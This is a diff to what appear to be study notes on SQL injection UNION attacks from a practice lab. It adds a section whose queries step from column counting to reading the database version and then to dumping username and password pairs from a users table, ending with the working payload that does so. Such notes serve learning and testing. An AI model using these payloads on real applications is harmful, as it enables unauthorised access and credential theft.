@@ -38,3 +38,15 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,'YT7kqh',NULL-
 ```
 
 > Payload: `' UNION SELECT NULL,'YT7kqh',NULL--`
+
+## SQL injection UNION attack, retrieving data from other tables
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a'--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,version()--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,username||':'||password FROM users--'
+```
+
+> Payload : `' UNION SELECT NULL,username||':'||password FROM users--`
